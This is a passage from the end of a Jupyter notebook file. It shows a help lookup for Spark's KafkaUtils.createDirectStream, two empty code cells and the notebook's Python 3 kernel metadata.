    "KafkaUtils.createDirectStream?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
